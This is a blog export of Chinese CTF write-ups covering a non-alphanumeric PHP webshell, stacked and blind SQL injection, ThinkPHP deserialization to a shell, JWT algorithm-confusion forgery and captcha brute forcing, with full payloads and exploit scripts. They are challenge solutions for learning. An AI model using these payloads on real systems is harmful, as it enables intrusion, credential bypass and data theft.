{"meta":{"title":"stuxnet8's blog","subtitle":null,"description":null,"author":"Stuxnet8","url":"https://Foxgrin.github.io"},"pages":[{"title":"about","date":"2018-07-10T08:49:50.000Z","updated":"2018-07-10T09:05:20.519Z","comments":true,"path":"about/index.html","permalink":"https://Foxgrin.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-07-10T08:45:22.000Z","updated":"2018-07-10T09:05:04.058Z","comments":false,"path":"categories/index.html","permalink":"https://Foxgrin.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-07-10T08:40:04.000Z","updated":"2018-07-10T09:04:55.904Z","comments":false,"path":"tags/index.html","permalink":"https://Foxgrin.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"不含数字和字母的webshell","slug":"不含数字和字母的webshell","date":"2019-05-29T15:31:00.000Z","updated":"2019-05-29T18:58:44.590Z","comments":true,"path":"/posts/20456/","link":"","permalink":"https://Foxgrin.github.io/posts/20456/","excerpt":"通过中南大学院赛的一道Web题学习一下如何在过滤数字和字母的情况下编写出webshell","text":"通过中南大学院赛的一道Web题学习一下如何在过滤数字和字母的情况下编写出webshell 本题来自于中南大学院赛的一道Web题，题目名字为badip 题目如下： 看起来像是道sql注入题，但是尝试了一下?id=1&#39; 像是过滤了单引号，再尝试1%23，1 order by 100%23都得到id=1的结果，看起来又不像是注入题，题目名为badip，没有找到考点，只能尝试扫一扫后台 发现了文件robots.txt 访问后发现存在两个文件：include.php和phpinfo.php 访问include.php 存在lfi，那么就用伪协议读一下index.php吧 解码一下得源码： 在源码末尾处发现采用sql预编译，那么就不用考虑注入了，忽略这段代码，让我们把目光放在前半部分得代码： 我们可以发现，当参数id包含#|\\&quot;|&#39;|sleep|benchmark|outfile|dumpfile|load_file|join时，后台将会把我们得客户ip记录在txt文件中，并且源码中也告诉了我们参数ip取值自$_SERVER[&#39;HTTP_CLIENT_IP&#39;]，是可以通过头部字段：client-ip进行控制，也有将记录的txt文件路径返回给我们 这时又想到前面的lfi，思路便很清晰了，我们可以通过在client-ip注入webshell，再利用lfi包含写入webshell的txt文件即可 那么唯一需要注意的地方就是对ip参数的过滤： 1234if(preg_match(&apos;/[a-z0-9]/is&apos;,$ip)) &#123; echo &quot;you bad bad ~ &quot;; die; &#125; 不能包含数字和字母，这就想到了之前看到的p神的一篇文章：一些不包含数字和字母的webshell 编写不含数字和字母的webshell，思路总结一句话便是：利用合法字符（即非数字，字母的字符）通过各种变换，拼接出字符串assert，再利用php支持动态函数执行的特性，将字符串assert当成函数以动态执行 如果在php7中，assert是一个语言结构而不是函数，不能再作为函数名而动态执行，但是在本题中，给出了phpinfo.php文件 说明了版本为5.6，所以我们就可以毫无顾虑的构造assert了 这里我采用了p神指出的第三种方法来构造assert，这就需要利用php的一个特性： 1在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 $a = &apos;Z&apos;; $a++; 将把 $a 变成&apos;AA&apos;，而在 C 中，a = &apos;Z&apos;; a++; 将把 a 变成 &apos;[&apos;（&apos;Z&apos; 的 ASCII 值是 90，&apos;[&apos; 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。 这个特性简单地说就是：&#39;a&#39;++ == &#39;b&#39;，&#39;b&#39;++ == &#39;c&#39;，我们只需要拿到一个变量，其值为a或者A，再利用自增操作来分别得到assert或者ASSERT的各个字符，因为php函数大小写不敏感 那么如何拿到字符a或者A呢，我们知道数组Array的第一个字符便是A，而php中数组与字符连接时，数组将自动转化为字符串Array 那么构造ASSERT代码如下： 1234567891011121314151617$_ = [];$_ = \"$_\"; //$_ == \"Array\"$_ = $_['!' == '@']; //$_ == 'A'$__ = $_; //$__ == 'A'$___ = $_; //$___ == 'A'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__ == 'S'$___ .= $__;$___ .= $__; //$___ == 'ASS'$__ = $_; //$__ == 'A'$__++;$__++;$__++;$__++; //$__ == 'E'$___ .= $__; //$___ == 'ASSE'$__ = $_; //$__ == 'A'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__ == 'R'$___ .= $__; //$___ == 'ASSER'$__ = $_; //$__ == 'A'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__ == 'T'$___ .= $__; //$___ == 'ASSERT' 同样原理构造POST： 123456789101112$__ = $_; //$__ == 'A'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__ == 'P'$____ = '_'.$__; //$____ == '_P'$__ = $_; //$__ == 'A'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__ == 'O'$____ .= $__; //$____ == '_PO'$__ = $_; //$__ == 'A'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__ == 'S'$____ .= $__; //$____ == '_POS'$__ = $_; //$__ == 'A'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__ == 'T'$____ .= $__; //$____ == '_POST' 最后构造ASSERT($_POST[_])： 12$_ = $$____;$___($_[_]); 另外我们还要考虑到标签&lt;?php ?&gt;的问题，如果在php配置中开启配置short_open_tag = On，则可以直接短标签&lt;? ?&gt;，我们在phpinfo中确认一下 配置short_open_tag开启，所以最后我们构造头部参数 1client-ip=&lt;? $_ = [];$_ = @&quot;$_&quot;;$_ = $_[&apos;!&apos; == &apos;@&apos;];$__ = $_;$___ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___ .= $__;$___ .= $__;$__ = $_;$__++;$__++;$__++;$__++;$___ .= $__;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___ .= $__;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___ .= $__;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____ = &apos;_&apos;;$____.=$__;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____ .= $__;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____ .= $__;$__ = $_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____ .= $__;$_____=$$____;$___($_____[_]); ?&gt; 再利用文件包含执行命令即可获得flag","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"2019强网杯Web部分题解","slug":"2019强网杯Web部分题解","date":"2019-05-28T16:15:00.000Z","updated":"2019-05-29T04:15:43.367Z","comments":true,"path":"/posts/42551/","link":"","permalink":"https://Foxgrin.github.io/posts/42551/","excerpt":"最近到了考试月忙着复习，强网杯没时间打，只能趁着晚上熬夜偷鸡来复现了（考试月真心累…）","text":"最近到了考试月忙着复习，强网杯没时间打，只能趁着晚上熬夜偷鸡来复现了（考试月真心累…） 随便注本题docker环境：https://github.com/CTFTraining/qwb_2019_supersqli 题目如下： 测试发现利用正则匹配过滤了关键字：select，update，drop，delete，insert，where等 这么狠的过滤还是第一次见到，如果正常而言真的是没有办法注入了，但是这题源码是能够支持堆叠查询的 我们可以看一下php手册中对函数mysqli_multi_query的说明： 1mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。 在sql-labs 38关中也有对堆叠注入进行了特别的说明 下面我们就先利用堆叠注入看看表名，payload：http://127.0.0.1:8302/?inject=0%27;show%20tables; 表名有words和1919810931114514 我们再分别看看两个表分别的结构： 12http://127.0.0.1:8302/?inject=0%27;show%20columns%20from%20`words`;http://127.0.0.1:8302/?inject=0%27;show%20columns%20from%20`1919810931114514`; 这里需要特别注意表1919810931114514时一定要通过符号进行包裹，不然会报错 所以我们可以得出该数据库下的表结构： words id int(10) data varchar(20) 1919810931114514 flag varchar(100) 由于flag在1919810931114514表中，那么源码查询的sql语句就为： 1select * from `words` where id=&apos;$id&apos;; 由于过滤了select关键字，我们可以使用预编译的方法来进行sql查询，另外alter和rename未被过滤，所以我们也可以通过修改表名和表的结构的方法来查询flag，所以这题有两种解题方法 预编译预编译的语法如下： 1234set @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);prepare presql from @sql;execute presql;deallocate prepare presql; 构造payload： 1http://127.0.0.1:8302/?inject=0%27;set%20@sql=concat(%27selec%27,%27t%20flag%20from%20`1919810931114514`%27);prepare%20presql%20from%20@sql;execute%20presql;deallocate%20prepare%20presql; 结果显示：strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;); 由于函数strstr是区分大小写的，所以我们用大小写混合绕过即可 最后的payload： 1http://127.0.0.1:8302/?inject=0%27;Set%20@sql=concat(%27selec%27,%27t%20flag%20from%20`1919810931114514`%27);Prepare%20presql%20from%20@sql;execute%20presql;deallocate%20Prepare%20presql; 修改表名和表结构修改表名语法如下： 1RENAME TABLE tablename1 TO tablename2; 修改表中的列语法如下： 1ALTER TABLE tablename CHANGE column1 column2 varchar(100); 那么解题思路如下： 将words表修改为word表 将1919810931114514表修改为words表 将列flag修改为列id 根据源程序的sql语句：select * from words where id=&#39;$id&#39;; 就可以直接查询出flag了 payload如下： 1http://127.0.0.1:8302/?inject=0%27;RENAME%20TABLE%20`words`%20TO%20`word`;RENAME%20TABLE%20`1919810931114514`%20TO%20`words`;ALTER%20TABLE%20`words`%20CHANGE%20`flag`%20`id`%20varchar(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20`words`; 此时我们已经成功的将列flag修改成了id 最后用1&#39; or &#39;1查询出flag 高明的黑客本题docker环境：https://github.com/CTFTraining/qwb_2019_smarthacker 下载备份源码www.tar.gz 可以发现是一堆带有疑似一句话木马的参数 但是很多参数都是不能用的，例如上图列举的某个参数已经事先赋值了，所以我们需要在众多文件中寻找出可以利用的一句话木马参数 搜索可得知文件中使用的命令函数大概有3种：eval，assert，system 编写脚本进行搜索： 123456789101112131415161718192021222324252627282930313233import osimport requests,refilenames = os.listdir('/var/www/html/src')pattern = re.compile(r'\\$_[GEPOST]&#123;3,4&#125;\\[.*\\]')command = ['uname',\"system('uname');\"]flag = 'Linux'for name in filenames: print(name) with open('/var/www/html/src/'+name) as f: data = f.read() result = pattern.findall(data) for ret in result: try: passwd = re.findall(r\"'(.*)'\",ret)[0] if 'GET' in ret: for com in command: r = requests.get('http://127.0.0.1/src/'+name+'?'+passwd+'='+command) if flag in r.text: print(\"backdoor in:\",name) print(\"GET:\",passwd) break elif 'POST' in ret: for com in command: data = &#123; passwd:command &#125; r = requests.post('http://127.0.0.1/src/'+name,data=data) if flag in r.text: print(\"backdoor in:\",name) print(\"POST:\",passwd) except:pass 运行脚本后发现后门存在于xk0SzyKwfzw.php，木马参数为Efa5BVG 最后直接连上查找flag即可 upload本题docker环境：https://github.com/CTFTraining/qwb_2019_upload 题目如下： 随意注册一个用户，登陆可以发现有上传文件功能 随便上传一个木马测试一下，发现后台对图片内容做了检测，在文件头加入GIF89A后可以上传马 上传后再次登陆用户后，可以发现页面回显出了我们上传文件的路径 访问该路径 发现我们上传的php文件是被为了png文件，因为没有找到存在文件包含的点，所以无奈只能扫描后台，看看有没有什么遗漏的提示文件 果然，发现了备份文件www.tar.gz，既然有源码那么就是考察代码审计了 下载下来后，发现是一个thinkphp框架，那么就先查看一下框架下的路由信息(tp5/route/route.php) 接下来，再找应用部分(tp5/application/web/controller/Index.php) 值得关注的点是函数login_check中的变量profile取自cookie中的user属性，之后对profile进行了反序列化，那么这里就可能存在通过cookie注入进行的反序化的点 我们继续审计controller下的其他文件，看看什么可以加以利用的地方 在Profile.php文件的方法upload_img中，有一个通过copy函数进行上传文件移动的操作，跟踪其中的参数$this-&gt;filename_tmp和$this-&gt;filename和操作执行的条件参数$this-&gt;ext 发现都是Profile类的公有属性，都是可以通过反序列化进行控制赋值的，所以暂时的思路就是利用反序列化将我们上传的png图片马修改为php文件木马 那么，如何让Profile类执行upload_img方法呢，让我们继续审计 在Profile类的末尾处，还发现了两个魔术方法：__get和__call，这两个魔术方法分别代表了在调用类的不可访问成员属性和不可访问方法时的处理方法。__get会从$this-&gt;except中查找不可访问的属性值，该变量也是可控的；__call会调用该类的成员变量所指代变量的所指代的方法 所以，审计到目前，思路更新如下： 通过cookie注入user属性进行反序列化 触发Profile类的__call魔术方法，使其执行该类的upload_img方法将png图片马修改为php文件马 那么问题又来了，我们知道要触发__call魔术方法，就必须要让Profile类调用一个该类中不存在的方法，所以我们只能继续审计，继续寻找利用点 在Register.php的末尾了，我们又发现了一个魔术方法__destruct，该方法在类被销毁时自动触发。我们可以发现该方法一经触发，并且参数$this-&gt;registed为0时，就可以调用成员$this-&gt;checker的index方法 跟踪这两个参数$this-&gt;registed和$this-&gt;checker 太完美了，又是可以通过反序列化进行控制的变量 那么，最终得到思路如下： 通过cookie反序列化为Register类的$checker赋值为Profile类，触发魔术方法__destruct后Profile类中的index方法 Profile类中没有index方法，触发魔术方法__call，调用Profile类中的upload_img方法 将png图片马修改为php文件马 这样就形成了一条完整的攻击链 接下来就是编写EXP，代码如下： 1234567891011121314151617181920&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Register&#123; public $checker; public $registed = false; public function __construct($checker)&#123; $this-&gt;checker = $checker; &#125;&#125;class Profile&#123; # 先上传一个图片马shell.png，保存路径为/upload/md5($_SERVER['REMOTE_ADDR'])/md5($_FILES['upload_file']['name']).\".png\" public $filename_tmp = './upload/3b1412753f475cc969c37231dd6eaea2/93bc3c03503d8768cf7cc1e39ce16fcb.png'; public $filename = './upload/3b1412753f475cc969c37231dd6eaea2/shell.php'; public $ext = true; public $except = array('index' =&gt; 'upload_img');&#125;$register = new Register(new Profile());echo urlencode(base64_encode(serialize($register))); 这里注意需要设置命名空间 app\\web\\controller（要不然反序列化会出错，不知道对象实例化的是哪个类） 我们将前面上传的图片马路径记下，运行EXP后得到base64加密后的序列化字符串： 1TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo0OntzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkLzNiMTQxMjc1M2Y0NzVjYzk2OWMzNzIzMWRkNmVhZWEyLzkzYmMzYzAzNTAzZDg3NjhjZjdjYzFlMzljZTE2ZmNiLnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvM2IxNDEyNzUzZjQ3NWNjOTY5YzM3MjMxZGQ2ZWFlYTIvc2hlbGwucGhwIjtzOjM6ImV4dCI7YjoxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7YjowO30%3D 然后重新登陆时置cookie的user属性值 然后我们此时就可以发现，此时能成功访问到shell了 再重新上传个shell拿flag就行了 最后附上代码思路整理图：","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"ISCC 2019 Writeup","slug":"ISCC2019","date":"2019-05-25T04:15:00.000Z","updated":"2019-05-25T05:14:05.776Z","comments":true,"path":"/posts/59602/","link":"","permalink":"https://Foxgrin.github.io/posts/59602/","excerpt":"这个比赛虽然总体难度不大，但是不得不感叹河南大军恐怖如斯，不准点做题拿个百血真不容易，垂直上分的大佬频繁出现，说这个比赛是一年一度的py大赛还是有点道理的（滑稽）。但是不得不说，参加这比赛还是学到蛮多套路的，脑洞大开，以及让人摸不着头的flag提交格式emmm","text":"这个比赛虽然总体难度不大，但是不得不感叹河南大军恐怖如斯，不准点做题拿个百血真不容易，垂直上分的大佬频繁出现，说这个比赛是一年一度的py大赛还是有点道理的（滑稽）。但是不得不说，参加这比赛还是学到蛮多套路的，脑洞大开，以及让人摸不着头的flag提交格式emmm Webweb1 首先要求输入的value的ascii码不在可见范围之内，但是最后要求value经过chr拼接后的username为’w3lc0me_To_ISCC2019’ php的chr函数会自动进行mod256，所以使用脚本： 12345678910111213s = \"w3lc0me_To_ISCC2019\"payload = \"\"s1 = \"&amp;value[]=\"for i in s: value = ord(i) + 256 payload = payload + s1 + str(value)print(payload) 1payload:value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313 再来就是要绕过intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333 intval函数处理字符串时，会从头开始检测到除数字以外的字母为止 我们注意到intval($password + 1) &gt; 2333 是先将$password + 1后再经过intval函数的处理，如果$password传入的是十六进制数，例如0x10，那么intval(‘0x10’)结果为0，intval(‘0x10’ + 1)结果为17，这个特性在7.0以上版本不适用 所以只需要把2333转换成16进制即可 payload:password=0x91d 所以最后的payload： 1/?value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313&amp;password=0x91d flag：flag{8311873e241ccad54463eaa5d4efc1e9} web2爆破三位数字密码，有图片验证码，需要借助python的pytesseract和Image库来识别图片验证码 脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsimport pytesseractimport refrom bs4 import BeautifulSoupfrom PIL import Imagefrom io import BytesIOimage_url = \"http://39.100.83.188:8002/vcode.php\"pass_url = 'http://39.100.83.188:8002/login.php's = requests.Session()password = 0def getImageCode(): while True: print('--------------------开始识别验证码') imageURL = image_url image = s.get(url=imageURL) captcha_img = Image.open(BytesIO(image.content)) imageCode = pytesseract.image_to_string(captcha_img) print('验证码识别结果:',imageCode) print('--------------------开始校验验证码') match = re.search(r'^[a-z | 0-9]&#123;4&#125;$',imageCode) if not match: print('验证码:',imageCode,'校验结果识别失败，继续识别') else: print('验证码:',imageCode,'校验成功') break return imageCodedef guess(password): while True: passwd = \"\" if len(str(password)) != 3: count = 3 - len(str(password)) for i in range(1,count+1): passwd = passwd + \"0\" passwd = passwd + str(password) print('--------------------------------------开始猜测密码') imageCode = getImageCode() data = &#123; 'username':'admin', 'pwd':passwd, 'user_code':imageCode &#125; g = s.post(url=pass_url,data=data) g.encoding = g.apparent_encoding if '验证码错误' in g.text: print(g.text) elif '密码错误' in g.text: print('密码:',passwd,'错误') password +=1 else : print('密码:',passwd,'正确') print('返回的页面结果:') print(g.text) break guess(password) 但是这题听说可以删掉cookie后直接绕过验证码，密码是996 flag：flag{996_ICU} web3sql-labs 24关原题，考察二次注入 注入点在login_create.php中的username字段，注册用户名为admin’# 之后登录admin’#，username字段就赋值给了session中的username字段 在password_change.php中的$username是直接从session中取出的，也就是取出的username为admin’# 拼接到sql语句中： users SET PASSWORD1UPDATE users SET PASSWORD=&apos;123&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos; 用户的密码就被修改为123 但是坑的地方在于这题没有设置容器，所有人共用一个数据库，可能很多人同时一起修改了admin用户的密码，所以有时候修改admin的密码后登陆不成功，并且这个数据库会定时修改所有用户的密码 所以能稳定登陆admin的方法是持续发送修改密码的包，如果admin’#用户被注册，注册admin’########也是可以的 最终登陆成功页面： web4 考察parse_str变量覆盖 payload:http://39.100.83.188:8066/index.php?action=auth&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&amp;key=1 flag{7he_rea1_f1@g_15_4ere} web6抓包发现是python写的网站，一开始有点慌，不过这题不是查考察python 我们登陆一个用户时抓包可以发现头部存在认证字段 1Authorization: iscc19 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaGh4NjY2IiwicHJpdiI6Im90aGVyIn0.vwB2Jj8TyGQhO6i0EEw6vCIrplCxrh23ZHQ15aWeeoQkYsd5tDSu3cixf-faEfQbLkB-_-6EF4DVxGbR5zGp4MyQn90KeRooOF65xQViZ8qRUVvylU5pJBDCcs-XEE-GdD6qfARNFpdg8toggC0ld5l5OJbeAA9au00xiaCxhzs 很明显是这个网站采用了JWT身份验证，类似于Session机制，JWT的token结构是Json格式，同时将认证信息以经过加密算法处理后存储在头部的Authorization字段 根据题目页面的提示：只有admin身份才能查看flag，那么这题多半就是考察伪造admin身份的认证字段登陆 我们可以将我们注册用户的认证字段拉近JWT的生成网站进行解密 解密后得到的字段正是JWT的token三个组成部分： Header： 1234&#123; &quot;alg&quot;: &quot;RS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125; 其中alg为算法的缩写，说明这串认证字符是经过RS256加密的。typ为类型的缩写 Payload： 1234&#123; &quot;name&quot;: &quot;hhx666&quot;, &quot;priv&quot;: &quot;other&quot;&#125; 这些是用户的信息 Signature： 1234HMACSHA256( base64Encode(header) + &quot;.&quot; + base64Encode(payload), secret) 这部分就是加密算法所使用的密钥 常见的加密算法有RS256和HS256，RS256是非对称加密，需要公钥和私钥才能对数据进行篡改，一般私钥我们是拿不到的，就像这题的认证字段正是经过RS256加密，而HS256则是对称加密，只需要公钥就可以进行伪造 在http://39.100.83.188:8053/static/js/common.js 源码处我们可以看到public key存放目录： 123456function getpubkey()&#123; /* get the pubkey for test /pubkey/&#123;md5(username+password)&#125; */&#125; /pubkey正是存放公钥的目录，它提示了我们公钥可以通过我们注册的用户名和密码的md5加密进行查看，我们访问http://39.100.83.188:8053/pubkey/7035124f823530ce2af7fb19bb625304 可以看到此RS256加密算法采用的公钥： 1&#123;&quot;pubkey&quot;:&quot;-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n-----END PUBLIC KEY-----&quot;,&quot;result&quot;:true&#125; 因为私钥无法获取到，所以这时我们就需要将算法修改为HS256,如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。 生成认证字段的脚本如下： 1234import jwtimport base64public = open('1.txt', 'r').read()print jwt.encode(&#123;\"name\": \"iscc19\",\"priv\": \"admin\"&#125;, key=public, algorithm='HS256') 说明一下1.txt中存放的公钥为： 123456-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PKomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1hKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtucIC+LX+9V/mpyKe9R3wIDAQAB-----END PUBLIC KEY----- 需要将网页上获得的公钥中\\n替换成换行，并且这里priv之前是为other，需要修改为admin身份，用户名name猜测为之前认证字段的iscc19 需要额外在python2环境下安装jwt模块：pip install PyJWT 一开始运行可能会出现下面的报错： 跟踪源库algorithms.py的源码，会发现prepare_key函数会检验非法字符，将检验过程去掉，再次运行 得到字符串：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaXNjYzE5IiwicHJpdiI6ImFkbWluIn0.bEza2gXi7_q9qPFTSgbu8wWRpmHqHd1FFa-rJKY_38c 然后将这串字符添加到头部的Authorization字段，附加上iscc19，访问/list，即可获得admin用户的list 最后访问http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277 即可获得flag 这题也是猜用户名iscc19稍微要有点脑洞的，emmm做的时候运气好直接拿这个用户名来试 参考文章：Json Web Token历险记 web5这题也是道脑洞题，一开始页面只给了信息：看来你并不是Union.373组织成员，请勿入内！ 扫描后台也没有结果，无奈只能尝试各种HTTP头部修改的方法，最后发现是在User-Agent头部字段最后添加上：Union.373 开始提示我们输入用户名和密码，通过POST方式传入参数username和password后，提示我们用户密码即为flag 在password字段加入单引号出现sql报错信息，很明显下面考察的是注出用户的密码 经过fuzz测试，过滤了#，(，)，extractvalue，sleep，and，password等关键参数，其中最致命的还是过滤了()，导致很多函数都无法使用 使用万能密码1&#39; or &#39;1登陆，发现了回显了用户名信息：union_373_Tom 既然有回显，就尝试一下联合查询： 1username=union_373_Tom&amp;password=1&apos; union select 1,2,3 or &apos; 回显了2 但是这里因为过滤了括号，导致我们无法使用子查询 查阅了一波过滤了括号的注入方式：https://blog.csdn.net/nzjdsds/article/details/81879181 这篇文章里提到的使用union order by的方式进行排序盲注，思路简单而言就是通过union使查询结果为union_373_Tom和我们拼接上的一行查询结果通过order by对密码password字段进行排序，并根据回显的用户名信息来判断排序的结果 下面用本地测试的过程来进行思路的说明： 这是users表中的初始数据，下面我们通过union插入我们构造的查询结果 可以看到对第三列进行了排序，并且可以根据我们插入的不同密码字段排序结果也不同，在页面上回显的用户名信息也不同： union拼接的密码字段排序后比成员密码大，回显用户名：union_373_Tom union拼接的密码字段排序后比成员密码小或相等，回显union拼接的用户名字段 另外因为题目password字段最后还需要闭合单引号，所以采用的是order by 3,&#39;1，mysql会先根据逗号前面的进行排序，如果数据相等，则使用逗号后的进行排序 所以最后使用的盲注payload为： 1username=union_373_Tom&amp;password=1&apos; or &apos;1&apos; union select 1,&apos;hhx&apos;,&apos;1&apos; from admin order by 3,&apos;1 我们知道order by是对字符串一位位的比较，所以思路就是对union_373_Tom的密码字段进行逐位的排序比较，根据回显的用户名，如果插入的密码字段大于用户名密码字段，则需要 最后需要弄清楚order by排序的原理，测试了好久，排序其实是根据字符ascii码的大小，另外mysql中大小写的字符的排序是相同的，测试后的字典序列为_ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa9876543210 脚本代码如下： 123456789101112131415161718192021import requestsurl = \"http://39.100.83.188:8054\"headers = &#123; 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36 Union.373' &#125;password = \"\"s = \"_ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa9876543210 \"for i in range(1,33): for j in s: p = password + j data = &#123; 'username':'union_373_Tom', 'password':\"1' or '1' union select 1,'hhx','\"+p+\"' from admin order by 3,'1\" &#125; r = requests.post(url,data=data,headers=headers) r.encoding = r.apparent_encoding if 'hhx' in r.text: password = password + j print('password:',password) break 最后的密码为1SCC_2OI9 flag：flag{1SCC_2OI9} Misc隐藏的信息 8进制转16进制，16进制转字符串，最后base64解密得flag 123456789101112&lt;?php $s = \"0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113\";$message = explode(\" \", $s);$m = \"\";for($i=0;$i&lt;count($message);$i++)&#123; $m = $m.base_convert($message[$i],8,16);&#125;$m = hex2bin($m);echo base64_decode($m); ?&gt; Flag: ISCC{N0_0ne_can_st0p_y0u} 倒立屋用Stegsolve工具打开 根据倒立屋题目提示，flag就是IsCc_2019倒过来 Keyes’ secret键盘密码，网上有现成脚本 1234567891011121314151617181920212223242526272829STR = 